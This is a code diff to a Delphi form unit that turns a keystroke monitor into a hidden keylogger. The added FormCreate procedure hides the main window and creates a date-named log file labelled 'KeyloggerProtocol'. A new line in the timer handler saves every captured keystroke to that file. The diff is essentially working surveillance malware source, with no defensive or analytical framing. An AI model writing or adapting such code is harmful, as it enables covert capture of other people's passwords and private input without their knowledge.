@@ -20,6 +20,7 @@ type
     Memo2: TMemo;
     procedure Button1Click(Sender: TObject);
     procedure Timer1Timer(Sender: TObject);
+    procedure FormCreate(Sender: TObject);
   private
     { Private-Deklarationen }
   public
@@ -27,7 +28,7 @@ type
   end;
 
 var
-  Form1: TForm1;
+  Form1: TForm1; d:string;
 
 implementation
 
@@ -45,10 +46,23 @@ begin
   Memo2.SetFocus;
 end;
 
+procedure TForm1.FormCreate(Sender: TObject);
+var f:textfile;
+begin
+d:= datetostr(now) + '.txt';
+assignfile(f,d);
+rewrite(f);
+writeln(f, 'KeyloggerProtocol - EF Info');
+closefile(f);
+Application.ShowMainForm := False;
+Application.MainFormOnTaskbar := True;
+end;
+
 procedure TForm1.Timer1Timer(Sender: TObject);
 var
 InputKey, KeyResult : Integer;
 Pressed: Bool;
+f:textfile;
 begin
 
 InputKey := 0;
@@ -134,9 +148,10 @@ begin
     226: DisplayAction(' < ');
   else if (InputKey >=32) and (InputKey <=110) AND (InputKey <> 64) then
   begin
-    if pressed then Memo1.Text := Memo1.Text + Uppercase(Chr(InputKey)) + ' TAG: ' + IntToStr(InputKey);
+    if pressed then Memo1.Text := Memo1.Text + Uppercase(Chr(InputKey)) + ' TAG: ' + IntToStr(InputKey)
     else Memo1.Text := Memo1.Text + Lowercase(Chr(InputKey)) + ' TAG: ' + IntToStr(InputKey);
     Memo1.Lines.Add('');
+    Memo1.Lines.SaveToFile(d);
   end
   else // Exception for all undefined keys
     Memo1.Lines.Add(IntToStr(InputKey));
